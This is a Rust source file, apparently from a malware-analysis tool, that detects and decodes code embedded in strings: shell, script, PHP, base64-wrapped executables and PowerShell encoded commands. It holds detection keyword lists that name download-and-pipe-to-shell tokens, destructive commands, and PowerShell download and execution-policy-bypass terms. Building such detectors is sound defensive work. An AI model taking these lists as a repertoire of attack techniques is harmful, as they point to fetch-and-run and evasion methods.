//! Embedded Code Detector
//!
//! Analyzes strings extracted by stng to detect and analyze embedded code (both plain and encoded).
//! Detects Python, JavaScript, Shell, and PHP code in strings and re-analyzes them with full
//! AST parsing and capability detection.

use crate::analyzers::{detect_file_type_from_path, unified::UnifiedSourceAnalyzer, FileType};
use crate::capabilities::CapabilityMapper;
use crate::types::binary::StringInfo;
use crate::types::file_analysis::{encode_decoded_path, FileAnalysis};
use crate::types::Evidence;
use crate::types::{Criticality, Finding, FindingKind};
use anyhow::{Context, Result};
use rustc_hash::FxHashSet;
use std::fs;
use std::path::Path;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;

/// Maximum nesting depth for decoded strings (prevent infinite recursion)
const MAX_DECODE_DEPTH: usize = 3;

/// Maximum size for individual decoded string (10MB)
const MAX_DECODED_SIZE: usize = 10 * 1024 * 1024;

/// Maximum total decoded bytes per file (50MB)
const MAX_TOTAL_DECODED: usize = 50 * 1024 * 1024;

/// Minimum size for plain strings to analyze (reduce false positives)
const MIN_PLAIN_SIZE: usize = 50;

/// Minimum size for encoded strings to analyze (can be smaller)
const MIN_ENCODED_SIZE: usize = 20;

/// Minimum decoded size for executable payloads embedded as base64.
/// Tiny ELF/PE headers are common in tests and fixtures and are not useful standalone payloads.
const MIN_BASE64_EXECUTABLE_SIZE: usize = 256;

/// Minimum decoded size for compressed payloads embedded as base64.
/// Tiny gzip members are common in source test fixtures and should not spawn nested findings.
const MIN_BASE64_COMPRESSED_SIZE: usize = 160;

/// Maximum number of strings to analyze per file
const MAX_STRINGS_TO_ANALYZE: usize = 100;

/// Maximum entropy for code (compressed data has entropy > 7.5)
const MAX_CODE_ENTROPY: f64 = 7.5;

/// Detect if a string contains code worth analyzing
///
/// Uses stng's classification to identify Python, JavaScript, Shell, or PHP code.
/// For strings extracted by stng, classification is already done (no regex needed).
/// For strings from tree-sitter AST, we classify using stng::classify_string().
/// Returns Some(FileType) if code is detected, None otherwise.
#[must_use]
pub fn detect_language(string_info: &StringInfo, is_encoded: bool) -> Option<FileType> {
    detect_language_with_host(string_info, is_encoded, None)
}

/// Detect the language of embedded code, optionally filtering against the host file type.
/// When the host is known, detections that match syntactically similar languages are
/// suppressed to avoid false positives (e.g., Ruby files misdetected as Python).
pub fn detect_language_with_host(
    string_info: &StringInfo,
    is_encoded: bool,
    host_file_type: Option<&FileType>,
) -> Option<FileType> {
    let result = detect_language_inner(string_info, is_encoded)?;

    // Suppress false positives from syntactically similar languages
    if let Some(host) = host_file_type {
        if is_sibling_language(host, &result) {
            tracing::debug!(
                "Suppressing {:?} detection in {:?} host (syntactic sibling)",
                result,
                host
            );
            return None;
        }
    }

    Some(result)
}

/// Languages that share enough syntax to cause false positives in embedded detection.
fn is_sibling_language(host: &FileType, detected: &FileType) -> bool {
    matches!(
        (host, detected),
        (FileType::Ruby, FileType::Python)
            | (FileType::Python, FileType::Ruby)
            | (FileType::Ruby, FileType::Perl)
            | (FileType::Perl, FileType::Ruby)
    )
}

fn detect_language_inner(string_info: &StringInfo, is_encoded: bool) -> Option<FileType> {
    let value = &string_info.value;

    // Use stng's classification (either from extraction or by calling classify_string)
    use crate::types::binary::StringType;

    let kind = &string_info.string_type;

    // Check if already classified as code by stng
    match kind {
        Some(StringType::PythonCode) => {
            if should_reject_markup(value, is_encoded) {
                return None;
            }
            return Some(FileType::Python);
        }
        Some(StringType::JavaScriptCode) => {
            if should_reject_markup(value, is_encoded) {
                return None;
            }
            return Some(FileType::JavaScript);
        }
        Some(StringType::PhpCode) => {
            if should_reject_markup(value, is_encoded) {
                return None;
            }
            if !is_probable_php(value, is_encoded) {
                return None;
            }
            return Some(FileType::Php);
        }
        Some(StringType::ShellCmd) => {
            if is_real_shell(value) {
                return Some(FileType::Shell);
            }
        }
        _ => {}
    }

    // Size checks for unclassified strings
    let min_size = if is_encoded {
        MIN_ENCODED_SIZE
    } else {
        MIN_PLAIN_SIZE
    };

    if value.len() < min_size || value.len() > MAX_DECODED_SIZE {
        return None;
    }

    // Check entropy (skip compressed/encrypted data)
    if calculate_entropy(value.as_bytes()) > MAX_CODE_ENTROPY {
        return None;
    }

    // Inline source maps frequently carry original source in base64 comments.
    // Those are packaging metadata, not hidden payloads, and should not generate
    // embedded-code detections for each decoded sourcesContent entry.
    if is_source_map_payload(value) {
        return None;
    }

    // Benign JavaScript color helpers often embed ANSI escapes in template literals.
    // These are decoded unicode-escape strings, but they are not hidden payloads.
    if is_encoded && looks_like_ansi_color_helper(value) {
        return None;
    }

    // If not classified as code by stng yet, classify it now
    let classified_kind = stng::classify_string(value);
    match classified_kind {
        Some(StringType::PythonCode) => {
            if should_reject_markup(value, is_encoded) {
                return None;
            }
            return Some(FileType::Python);
        }
        Some(StringType::JavaScriptCode) => {
            if should_reject_markup(value, is_encoded) {
                return None;
            }
            return Some(FileType::JavaScript);
        }
        Some(StringType::PhpCode) => {
            if should_reject_markup(value, is_encoded) {
                return None;
            }
            if !is_probable_php(value, is_encoded) {
                return None;
            }
            return Some(FileType::Php);
        }
        Some(StringType::ShellCmd) => {
            if is_real_shell(value) {
                return Some(FileType::Shell);
            }
        }
        _ => {}
    }

    None
}

fn is_source_map_payload(value: &str) -> bool {
    let trimmed = value.trim_start();
    if !trimmed.starts_with('{') {
        return false;
    }

    let markers = [
        "\"version\":3",
        "\"sources\":[",
        "\"mappings\":\"",
        "\"sourcesContent\":[",
    ];

    markers.iter().all(|marker| trimmed.contains(marker))
}

fn is_source_map_string_set(strings: &[StringInfo]) -> bool {
    let mut has_version = false;
    let mut has_sources = false;
    let mut has_mappings = false;
    let mut has_sources_content = false;

    for string_info in strings {
        match string_info.value.as_str() {
            "version" => has_version = true,
            "sources" => has_sources = true,
            "mappings" => has_mappings = true,
            "sourcesContent" => has_sources_content = true,
            _ => {}
        }
    }

    has_version && has_sources && has_mappings && has_sources_content
}

fn is_inline_source_map_offset(parent_path: &str, offset: u64) -> bool {
    let host_path = parent_path.split("##").next().unwrap_or(parent_path);
    let Ok(data) = fs::read(host_path) else {
        return false;
    };

    let offset = offset as usize;
    if offset > data.len() {
        return false;
    }

    let start = offset.saturating_sub(128);
    let context = &data[start..offset];
    let context = String::from_utf8_lossy(context);

    context.contains("sourceMappingURL=data:application/json") && context.contains("base64,")
}

fn should_reject_markup(value: &str, is_encoded: bool) -> bool {
    !is_encoded && looks_like_passive_markup(value)
}

fn looks_like_markup(value: &str) -> bool {
    let trimmed = value.trim_start();

    if !(trimmed.starts_with('<') || trimmed.contains("xmlns=")) {
        return false;
    }

    let markup_markers = [
        "<svg",
        "</svg",
        "<div",
        "</div",
        "<span",
        "</span",
        "<html",
        "</html",
        "<body",
        "</body",
        "<foreignObject",
        "</foreignObject",
        "<xhtml:",
        "xmlns=",
        "xmlns:",
        "<![CDATA[",
    ];

    markup_markers.iter().any(|marker| trimmed.contains(marker))
}

fn looks_like_passive_markup(value: &str) -> bool {
    if !looks_like_markup(value) {
        return false;
    }

    let active_markers = [
        "<script",
        "</script",
        "javascript:",
        "onload=",
        "onerror=",
        "onclick=",
        "onbegin=",
        "href=\"data:",
        "href='data:",
        "xlink:href=\"data:",
        "xlink:href='data:",
        "<?php",
        "<?=",
    ];

    !active_markers.iter().any(|marker| value.contains(marker))
}

fn looks_like_ansi_color_helper(value: &str) -> bool {
    value.contains('\u{1b}')
        && value.contains("colors ?")
        && value.contains("${m}")
        && value.contains(": m")
}

fn looks_like_cli_help_snippet(value: &str) -> bool {
    let long_option_count = value.match_indices("--").count();

    long_option_count >= 2
        && (value.contains('<')
            || value.contains("option")
            || value.contains("options")
            || value.contains("curl --help")
            || value.contains("curl --manual")
            || value.contains("Use ")
            || value.contains("Consider ")
            || value.contains("Failed to "))
}

/// Additional heuristic to filter out false positive shell detection (like foreign languages)
fn is_real_shell(value: &str) -> bool {
    // NOTE: shebang (#!) is NOT shell — it's a kernel execve directive.
    // A string starting with #!/usr/bin/env ruby is Ruby, not shell.

    if looks_like_cli_help_snippet(value) {
        return false;
    }

    // Look for common shell keywords/patterns that are rare in natural language
    let strong_keywords = [
        "sudo ",
        "grep ",
        "curl ",
        "wget ",
        "chmod ",
        "chown ",
        "apt-get ",
        "yum ",
        "systemctl ",
        "service ",
        "export ",
        "unset ",
        "alias ",
        " | sh",
        " | bash",
        "rm -rf ",
        "mkdir -p ",
        "tail -f ",
        "cat <<",
        "EOF",
    ];

    if strong_keywords.iter().any(|&k| value.contains(k)) {
        return true;
    }

    if has_shell_redirection(value) && has_shell_execution_context(value) {
        return true;
    }

    // Check for plausible shell-style variable assignment followed by expansion.
    // Random XOR-decoded noise often contains stray '=' and '$' bytes.
    if has_shell_variable_assignment(value) && has_shell_variable_expansion(value) {
        return true;
    }

    false
}

fn has_shell_variable_assignment(value: &str) -> bool {
    value
        .split(|c: char| c.is_ascii_whitespace() || matches!(c, ';' | '|' | '&' | '(' | ')'))
        .filter_map(|token| token.split_once('='))
        .any(|(name, _)| is_shell_identifier(name))
}

fn has_shell_variable_expansion(value: &str) -> bool {
    let bytes = value.as_bytes();
    let mut i = 0;

    while i < bytes.len() {
        if bytes[i] != b'$' {
            i += 1;
            continue;
        }

        if i + 1 >= bytes.len() {
            break;
        }

        if bytes[i + 1] == b'{' {
            let start = i + 2;
            let mut end = start;
            while end < bytes.len() && bytes[end] != b'}' {
                end += 1;
            }
            if end > start
                && end < bytes.len()
                && std::str::from_utf8(&bytes[start..end])
                    .ok()
                    .is_some_and(is_shell_identifier)
            {
                return true;
            }
            i = end.saturating_add(1);
            continue;
        }

        let mut end = i + 1;
        while end < bytes.len() && is_shell_identifier_char(bytes[end] as char) {
            end += 1;
        }
        if end > i + 1
            && std::str::from_utf8(&bytes[i + 1..end])
                .ok()
                .is_some_and(is_shell_identifier)
        {
            return true;
        }
        i = end;
    }

    false
}

fn has_shell_redirection(value: &str) -> bool {
    value.contains("2>&1") || value.contains("> /dev/null") || value.contains(">/dev/null")
}

fn has_shell_execution_context(value: &str) -> bool {
    let bytes = value.as_bytes();

    for pattern in ["2>&1", "> /dev/null", ">/dev/null"] {
        let mut start = 0;
        while let Some(relative_idx) = value[start..].find(pattern) {
            let idx = start + relative_idx;
            if has_command_before(bytes, idx) {
                return true;
            }
            start = idx + pattern.len();
        }
    }

    value.contains("&&") || value.contains("||") || value.contains("; ")
}

fn has_command_before(bytes: &[u8], marker_idx: usize) -> bool {
    let prefix = &bytes[..marker_idx];
    let end = prefix
        .iter()
        .rposition(|b| !b.is_ascii_whitespace())
        .map(|pos| pos + 1)
        .unwrap_or(0);
    if end == 0 {
        return false;
    }

    let start = prefix[..end]
        .iter()
        .rposition(u8::is_ascii_whitespace)
        .map_or(0, |pos| pos + 1);
    if start >= end {
        return false;
    }

    let Ok(token) = std::str::from_utf8(&prefix[start..end]) else {
        return false;
    };

    is_shell_command_token(token)
}

fn is_shell_command_token(token: &str) -> bool {
    if token.is_empty() {
        return false;
    }

    let trimmed = token.trim_matches(|c: char| matches!(c, '"' | '\'' | '(' | ')'));
    if trimmed.is_empty() {
        return false;
    }

    if !trimmed.chars().any(|c| c.is_ascii_alphabetic()) {
        return false;
    }

    trimmed
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.' | '/' | ':'))
}

fn is_shell_identifier(name: &str) -> bool {
    let mut chars = name.chars();
    match chars.next() {
        Some(first) if first == '_' || first.is_ascii_alphabetic() => {}
        _ => return false,
    }
    chars.all(is_shell_identifier_char)
}

fn is_shell_identifier_char(c: char) -> bool {
    c == '_' || c.is_ascii_alphanumeric()
}

fn is_probable_php(value: &str, is_encoded: bool) -> bool {
    let trimmed = value.trim_start();

    if trimmed.starts_with("<?php") || trimmed.starts_with("<?=") {
        return true;
    }

    if !is_encoded {
        return false;
    }

    let markers = [
        "$_GET",
        "$_POST",
        "$_REQUEST",
        "$_COOKIE",
        "$_SERVER",
        "$this->",
        "->",
        "function ",
        "echo ",
        "print ",
        "eval(",
        "base64_decode(",
        "include ",
        "include_once",
        "require ",
        "require_once",
        "phpinfo(",
        "$",
    ];

    markers.iter().any(|marker| value.contains(marker))
}

fn is_top_level_self_detection(
    parent_path: &str,
    is_encoded: bool,
    offset: u64,
    file_type: &FileType,
) -> bool {
    if is_encoded || offset != 0 {
        return false;
    }
    let host_type = detect_file_type_from_path(Path::new(parent_path));
    host_type == *file_type
        || is_sibling_language(&host_type, file_type)
        || host_type.is_source_code()
}

/// Calculate Shannon entropy of data
fn calculate_entropy(data: &[u8]) -> f64 {
    if data.is_empty() {
        return 0.0;
    }

    let mut counts = [0u32; 256];
    for &byte in data {
        counts[byte as usize] += 1;
    }

    let len = data.len() as f64;
    let mut entropy = 0.0;

    for &count in &counts {
        if count > 0 {
            let p = count as f64 / len;
            entropy -= p * p.log2();
        }
    }

    entropy
}

/// Convert FileType to language name string
fn lang_name(file_type: &FileType) -> &'static str {
    match file_type {
        FileType::Python => "python",
        FileType::JavaScript => "javascript",
        FileType::Shell => "shell",
        FileType::Php => "php",
        _ => "unknown",
    }
}

/// Generate automatic language detection trait (auto-generated, no YAML needed like metadata/sign)
fn generate_language_trait(
    detected_lang: &FileType,
    encoding_chain: &[String],
    offset: u64,
) -> Finding {
    let (trait_id, criticality) = if encoding_chain.is_empty() {
        // Plain embedded code is structural context, not a behavioral objective.
        (
            format!("metadata/lang/embedded::{}", lang_name(detected_lang)),
            Criticality::Baseline,
        )
    } else {
        let encoding = &encoding_chain[0];
        // Wide-encoded JavaScript in native binaries is frequently legitimate embedded UI
        // content. The decoded script is analyzed separately, so keep the generic language
        // marker structural rather than suspicious and avoid colliding with trait-based
        // encoded-language rules that are tuned independently.
        if encoding == "wide" && matches!(detected_lang, FileType::JavaScript) {
            (
                format!("metadata/lang/embedded::{}", lang_name(detected_lang)),
                Criticality::Baseline,
            )
        } else {
            let crit = if encoding == "url" {
                Criticality::Notable
            } else {
                Criticality::Suspicious
            };
            (
                format!(
                    "metadata/lang/encoded/{}::{}",
                    encoding,
                    lang_name(detected_lang)
                ),
                // Encoded code is suspicious by default because it often reflects obfuscation.
                // URL encoding is common enough in some contexts (like format strings) to downgrade to Notable.
                crit,
            )
        }
    };

    let description = format!(
        "{} code {} in string",
        lang_name(detected_lang),
        if encoding_chain.is_empty() {
            "embedded"
        } else {
            "encoded"
        }
    );

    Finding {
        id: trait_id,
        kind: crate::types::FindingKind::Capability,
        desc: description,
        conf: 1.0,
        crit: criticality,
        mbc: None,
        attack: None,
        trait_refs: vec![],
        evidence: vec![Evidence {
            method: "embedded-code-detection".to_string(),
            source: "string-analysis".to_string(),
            value: format!(
                "Detected {} at offset {:#x}",
                lang_name(detected_lang),
                offset
            ),
            location: Some(format!("{:#x}", offset)),
            ..Default::default()
        }],
        match_count: 0,
        source_file: None,
    }
}

/// Result of analyzing an embedded string
#[derive(Debug)]
pub enum EmbeddedAnalysisResult {
    /// Encoded code - becomes a separate layer (FileAnalysis)
    EncodedLayer(Box<FileAnalysis>),
    /// Plain embedded code - findings added to parent
    PlainEmbedded(Vec<Finding>),
}

/// Analyze a string detected as code
pub fn analyze_embedded_string(
    parent_path: &str,
    string_info: &StringInfo,
    _string_index: usize,
    capability_mapper: &Arc<CapabilityMapper>,
    current_depth: usize,
) -> Result<EmbeddedAnalysisResult> {
    // Check depth limit
    if current_depth >= MAX_DECODE_DEPTH {
        anyhow::bail!("Maximum decode depth {} exceeded", MAX_DECODE_DEPTH);
    }

    // Detect language (uses stng classification, no regex needed)
    let t_detect = std::time::Instant::now();
    let is_encoded = !string_info.encoding_chain.is_empty();
    let file_type =
        detect_language(string_info, is_encoded).context("No language detected in string")?;
    let detect_time = t_detect.elapsed();

    let offset = string_info.offset.unwrap_or(0);

    if is_encoded && is_inline_source_map_offset(parent_path, offset) {
        anyhow::bail!("Inline source map data URL, not embedded code");
    }

    // Avoid reporting the parent file itself as "embedded" code when the detector
    // reclassifies the full source buffer starting at offset 0x0.
    if is_top_level_self_detection(parent_path, is_encoded, offset, &file_type) {
        anyhow::bail!("Top-level source self-detected as embedded code");
    }

    // Create virtual path
    let virtual_path = if is_encoded {
        encode_decoded_path(parent_path, &string_info.encoding_chain, offset as usize)
    } else {
        format!("{}##plain@{:#x}", parent_path, offset)
    };

    // Create analyzer for detected language; disable embedded detection to prevent recursion.
    let analyzer = UnifiedSourceAnalyzer::for_file_type(&file_type)
        .context("Failed to create analyzer for language")?
        .with_capability_mapper_arc(capability_mapper.clone())
        .without_embedded_detection();

    // Analyze in-memory
    let t_analyze = std::time::Instant::now();
    let mut report = analyzer.analyze_source(Path::new(&virtual_path), &string_info.value);
    let analyze_time = t_analyze.elapsed();

    if analyze_time.as_millis() > 100 {
        tracing::debug!(
            "embedded_code_detector: Slow analysis - detect: {:?}, analyze: {:?}, lang: {:?}, size: {}",
            detect_time,
            analyze_time,
            file_type,
            string_info.value.len()
        );
    }

    // Generate language detection trait (auto-generated, no YAML needed)
    let lang_trait = generate_language_trait(&file_type, &string_info.encoding_chain, offset);

    if is_encoded {
        // Encoded code - create a separate layer
        report.findings.push(lang_trait);

        let mut file_entry = report.to_file_analysis(0);
        file_entry.path = virtual_path.clone();
        file_entry.depth = (current_depth + 1) as u32;
        file_entry.encoding = Some(string_info.encoding_chain.clone());

        // Prefix evidence locations
        for finding in &mut file_entry.findings {
            for evidence in &mut finding.evidence {
                evidence.location = Some(format!(
                    "decoded:{}:{}",
                    virtual_path,
                    evidence.location.as_deref().unwrap_or("unknown")
                ));
            }
        }

        file_entry.compute_summary();
        Ok(EmbeddedAnalysisResult::EncodedLayer(Box::new(file_entry)))
    } else {
        // Plain embedded code - return findings for parent
        let mut findings = report.findings;
        findings.push(lang_trait);

        // Prefix evidence locations to indicate they came from embedded code
        for finding in &mut findings {
            for evidence in &mut finding.evidence {
                evidence.location = Some(format!(
                    "embedded@{:#x}:{}",
                    offset,
                    evidence.location.as_deref().unwrap_or("unknown")
                ));
            }
        }

        Ok(EmbeddedAnalysisResult::PlainEmbedded(findings))
    }
}

// ── Base64 binary payload detection ──────────────────────────────────────────

/// Minimum base64 string length to attempt binary decoding.
const MIN_BASE64_LEN: usize = 100;

fn is_base64_char(c: u8) -> bool {
    c.is_ascii_alphanumeric() || c == b'+' || c == b'/' || c == b'=' || c == b'-' || c == b'_'
}

/// Return true if `s` looks like a base64-encoded blob: long enough and nearly all base64 chars.
fn looks_like_base64(s: &str) -> bool {
    if s.len() < MIN_BASE64_LEN {
        return false;
    }
    let bytes = s.as_bytes();
    let base64_count = bytes
        .iter()
        .filter(|&&b| is_base64_char(b) || b == b'\n' || b == b'\r')
        .count();
    base64_count * 100 / bytes.len() >= 95
}

fn strip_whitespace(s: &str) -> String {
    s.chars().filter(|c| !c.is_whitespace()).collect()
}

/// Detect archive/binary type from raw magic bytes.
fn magic_type(data: &[u8]) -> Option<&'static str> {
    crate::analyzers::overlay::detect_archive_from_bytes(data).or_else(|| {
        if data.starts_with(b"MZ") {
            Some("pe")
        } else if data.len() >= 4 && data[..4] == [0x7F, 0x45, 0x4C, 0x46] {
            Some("elf")
        } else {
            None
        }
    })
}

/// Try to decode `string_info` as base64 containing a binary payload (PE, ELF, or archive).
/// Only runs at depth 0 to prevent compounding recursion.
///
/// Two paths:
/// - `encoding_chain = ["base64"]`: stng already decoded this; treat the value bytes directly.
/// - No encoding chain: try to base64-decode the value text and check magic.
fn detect_base64_binary(
    parent_path: &str,
    string_info: &StringInfo,
    depth: u32,
) -> Option<FileAnalysis> {
    if depth > 0 {
        return None;
    }

    // Path 1: stng already decoded the base64 for us — value bytes ARE the payload.
    let decoded: Vec<u8> = if string_info
        .encoding_chain
        .iter()
        .any(|e| e == "base64" || e == "base64-obf")
    {
        string_info.value.as_bytes().to_vec()
    } else {
        // Path 2: raw base64 text — decode it ourselves.
        if !looks_like_base64(&string_info.value) {
            return None;
        }
        let clean = strip_whitespace(&string_info.value);
        base64::Engine::decode(&base64::engine::general_purpose::STANDARD, &clean)
            .or_else(|_| {
                base64::Engine::decode(&base64::engine::general_purpose::URL_SAFE_NO_PAD, &clean)
            })
            .ok()?
    };

    let inner_type = magic_type(&decoded)?;
    if matches!(inner_type, "elf" | "pe") && decoded.len() < MIN_BASE64_EXECUTABLE_SIZE {
        return None;
    }
    if matches!(inner_type, "gz" | "zip" | "xz" | "bz2")
        && decoded.len() < MIN_BASE64_COMPRESSED_SIZE
    {
        return None;
    }
    let offset = string_info.offset.unwrap_or(0);
    let virtual_path = format!("{}##base64@{:#x}", parent_path, offset);
    let sha256 = crate::analyzers::utils::calculate_sha256(&decoded);

    let finding = Finding {
        kind: FindingKind::Capability,
        id: format!("binary/embedded/base64-{}", inner_type),
        desc: format!(
            "Base64-encoded {} payload ({} bytes decoded) at offset {:#x}",
            inner_type.to_uppercase(),
            decoded.len(),
            offset,
        ),
        conf: 0.85,
        crit: Criticality::Suspicious,
        mbc: None,
        attack: Some("T1027.009".to_string()),
        evidence: vec![Evidence {
            method: "base64_magic_detection".to_string(),
            source: "embedded_code_detector".to_string(),
            value: format!("decoded_size={} inner_type={}", decoded.len(), inner_type),
            location: Some(format!("offset:{:#x}", offset)),
            ..Default::default()
        }],
        match_count: 1,
        trait_refs: vec![],
        source_file: Some(parent_path.to_string()),
    };

    let mut entry = FileAnalysis::new(
        0,
        virtual_path,
        inner_type.to_string(),
        sha256,
        decoded.len() as u64,
    );
    entry.depth = depth + 1;
    entry.encoding = Some(vec!["base64".to_string()]);
    entry.findings = vec![finding];
    entry.compute_summary();
    Some(entry)
}

// ── PowerShell -EncodedCommand detection ─────────────────────────────────────

const PS_KEYWORDS: &[&str] = &[
    "Invoke-Expression",
    "IEX",
    "New-Object",
    "Add-Type",
    "Import-Module",
    "Start-Process",
    "DownloadString",
    "DownloadFile",
    "WebClient",
    "powershell",
    "PowerShell",
    "bypass",
    "EncodedCommand",
];

const ENC_FLAGS: &[&str] = &[
    "-EncodedCommand",
    "-encodedcommand",
    "-EncodedC",
    "-enc ",
    "-Enc ",
    " -ec ",
];

fn extract_ps_encoded_arg(s: &str) -> Option<&str> {
    for flag in ENC_FLAGS {
        if let Some(pos) = s.find(flag) {
            let after = s[pos + flag.len()..].trim_start();
            let end = after
                .find(|c: char| c.is_whitespace() || c == '"' || c == '\'')
                .unwrap_or(after.len());
            let blob = &after[..end];
            if blob.len() >= 40 {
                return Some(blob);
            }
        }
    }
    None
}

fn decode_utf16le(base64_blob: &str) -> Option<String> {
    let clean = strip_whitespace(base64_blob);
    let bytes = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, &clean).ok()?;
    if bytes.len() % 2 != 0 {
        return None;
    }
    let wide: Vec<u16> = bytes
        .chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .collect();
    String::from_utf16(&wide).ok()
}

fn has_ps_keywords(s: &str) -> bool {
    PS_KEYWORDS.iter().filter(|&&kw| s.contains(kw)).count() >= 2
}

/// Detect and decode a PowerShell -EncodedCommand blob within `string_info`.
fn detect_powershell_encoded_command(
    parent_path: &str,
    string_info: &StringInfo,
    capability_mapper: &Arc<CapabilityMapper>,
    current_depth: usize,
) -> Option<FileAnalysis> {
    if current_depth >= MAX_DECODE_DEPTH {
        return None;
    }
    let blob = extract_ps_encoded_arg(&string_info.value)?;
    let decoded = decode_utf16le(blob)?;
    if !has_ps_keywords(&decoded) {
        return None;
    }

    let offset = string_info.offset.unwrap_or(0);
    let virtual_path = format!("{}##base64-utf16le@{:#x}", parent_path, offset);

    let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::PowerShell)?
        .with_capability_mapper_arc(capability_mapper.clone())
        .without_embedded_detection();
    let mut report = analyzer.analyze_source(Path::new(&virtual_path), &decoded);

    report.findings.push(Finding {
        kind: FindingKind::Capability,
        id: "binary/embedded/base64-powershell".to_string(),
        desc: format!(
            "PowerShell -EncodedCommand payload ({} chars decoded) at offset {:#x}",
            decoded.len(),
            offset
        ),
        conf: 0.95,
        crit: Criticality::Suspicious,
        mbc: None,
        attack: Some("T1059.001".to_string()),
        evidence: vec![Evidence {
            method: "base64_utf16le_decode".to_string(),
            source: "embedded_code_detector".to_string(),
            value: format!("decoded_chars={}", decoded.len()),
            location: Some(format!("offset:{:#x}", offset)),
            ..Default::default()
        }],
        match_count: 1,
        trait_refs: vec![],
        source_file: Some(parent_path.to_string()),
    });

    let mut entry = report.to_file_analysis(0);
    entry.path = virtual_path;
    entry.depth = (current_depth + 1) as u32;
    entry.encoding = Some(vec!["base64-utf16le".to_string()]);
    entry.compute_summary();
    Some(entry)
}

/// Process all strings from a file, analyzing detected code
/// Returns (encoded_layers, plain_findings):
/// - encoded_layers: FileAnalysis entries for encoded code (true layers)
/// - plain_findings: Findings for plain embedded code (added to parent)
pub(crate) fn process_all_strings(
    parent_path: &str,
    strings: &[StringInfo],
    capability_mapper: &Arc<CapabilityMapper>,
    current_depth: usize,
    cancelled: Option<&AtomicBool>,
) -> (Vec<FileAnalysis>, Vec<Finding>) {
    process_all_strings_with_host(
        parent_path,
        strings,
        capability_mapper,
        current_depth,
        None,
        cancelled,
    )
}

pub(crate) fn process_all_strings_with_host(
    parent_path: &str,
    strings: &[StringInfo],
    capability_mapper: &Arc<CapabilityMapper>,
    current_depth: usize,
    _host_file_type: Option<&FileType>,
    cancelled: Option<&AtomicBool>,
) -> (Vec<FileAnalysis>, Vec<Finding>) {
    if is_source_map_string_set(strings) {
        tracing::debug!(
            "embedded_code_detector: Skipping source map payload strings for {}",
            parent_path
        );
        return (Vec::new(), Vec::new());
    }

    let mut encoded_layers = Vec::new();
    let mut plain_findings = Vec::new();
    let mut seen_binary_payloads: FxHashSet<(String, String, String)> = FxHashSet::default();
    let mut total_analyzed = 0;
    let mut total_bytes = 0;
    let mut detected_count = 0;

    let t_start = std::time::Instant::now();
    let total_string_bytes: usize = strings.iter().map(|s| s.value.len()).sum();
    let max_string_len = strings.iter().map(|s| s.value.len()).max().unwrap_or(0);
    tracing::trace!(
        "embedded_code_detector: Processing {} strings (total {} bytes, max {} bytes)",
        strings.len(),
        total_string_bytes,
        max_string_len
    );

    // Apply heuristic sorting to check most likely candidates first (like stng's XOR optimization)
    // We prioritize longer strings, and strings already classified as code by stng
    let mut sorted_strings: Vec<(usize, &StringInfo)> = strings.iter().enumerate().collect();
    sorted_strings.sort_by(|(_, a), (_, b)| {
        let is_code = |kind: &Option<crate::types::binary::StringType>| -> bool {
            matches!(
                kind,
                Some(
                    crate::types::binary::StringType::PythonCode
                        | crate::types::binary::StringType::JavaScriptCode
                        | crate::types::binary::StringType::PhpCode
                        | crate::types::binary::StringType::ShellCmd
                        | crate::types::binary::StringType::AppleScript
                )
            )
        };
        let score_a = if is_code(&a.string_type) {
            1000000
        } else {
            a.value.len()
        };
        let score_b = if is_code(&b.string_type) {
            1000000
        } else {
            b.value.len()
        };
        score_b.cmp(&score_a)
    });

    let mut detection_attempts = 0;
    let max_detection_attempts = std::cmp::min(256, strings.len()); // Check the 256 longest/most likely strings in massive files

    for (idx, string_info) in sorted_strings {
        if cancelled.is_some_and(|f| f.load(Ordering::Acquire)) {
            break;
        }
        if detection_attempts >= max_detection_attempts {
            break;
        }

        // Check limits
        if total_analyzed >= MAX_STRINGS_TO_ANALYZE {
            tracing::debug!(
                "embedded_code_detector: Hit MAX_STRINGS_TO_ANALYZE limit ({} analyzed)",
                total_analyzed
            );
            break;
        }

        if total_bytes >= MAX_TOTAL_DECODED {
            tracing::debug!(
                "embedded_code_detector: Hit MAX_TOTAL_DECODED limit ({} bytes)",
                total_bytes
            );
            break;
        }

        // Skip strings that are too large for code detection (likely obfuscated/packed data)
        // Real code fragments shouldn't be > 1MB
        const MAX_STRING_SIZE_FOR_DETECTION: usize = 1024 * 1024; // 1MB
        if string_info.value.len() > MAX_STRING_SIZE_FOR_DETECTION {
            continue;
        }

        // Benign XML/HTML/SVG template literals often contain namespace URLs and tags that
        // confuse generic code classifiers. Skip passive markup here before any deeper analysis.
        if string_info.encoding_chain.is_empty() && looks_like_passive_markup(&string_info.value) {
            continue;
        }

        detection_attempts += 1;

        // Check for PowerShell -EncodedCommand blobs first
        if let Some(ps_layer) = detect_powershell_encoded_command(
            parent_path,
            string_info,
            capability_mapper,
            current_depth,
        ) {
            detected_count += 1;
            total_bytes += string_info.value.len();
            total_analyzed += 1;
            encoded_layers.push(ps_layer);
            continue;
        }

        // Check for base64-encoded binary payloads (PE, ELF, archives)
        if let Some(bin_layer) =
            detect_base64_binary(parent_path, string_info, current_depth as u32)
        {
            let payload_key = (
                bin_layer.file_type.clone(),
                bin_layer.sha256.clone(),
                bin_layer
                    .encoding
                    .as_ref()
                    .map(|enc| enc.join("+"))
                    .unwrap_or_default(),
            );
            if !seen_binary_payloads.insert(payload_key) {
                continue;
            }
            detected_count += 1;
            total_bytes += string_info.value.len();
            total_analyzed += 1;
            encoded_layers.push(bin_layer);
            continue;
        }

        // Try to analyze this string as source code
        match analyze_embedded_string(
            parent_path,
            string_info,
            idx,
            capability_mapper,
            current_depth,
        ) {
            Ok(EmbeddedAnalysisResult::EncodedLayer(file_analysis)) => {
                detected_count += 1;
                total_bytes += string_info.value.len();
                total_analyzed += 1;
                encoded_layers.push(*file_analysis);
            }
            Ok(EmbeddedAnalysisResult::PlainEmbedded(findings)) => {
                detected_count += 1;
                total_bytes += string_info.value.len();
                total_analyzed += 1;
                plain_findings.extend(findings);
            }
            Err(_) => {
                // Not code or analysis failed - skip silently
                continue;
            }
        }
    }

    tracing::debug!(
        "embedded_code_detector: Processed {} strings in {:?}, detected {} as code, analyzed {}",
        detection_attempts,
        t_start.elapsed(),
        detected_count,
        total_analyzed
    );

    (encoded_layers, plain_findings)
}

#[cfg(test)]
mod tests {
    use super::*;

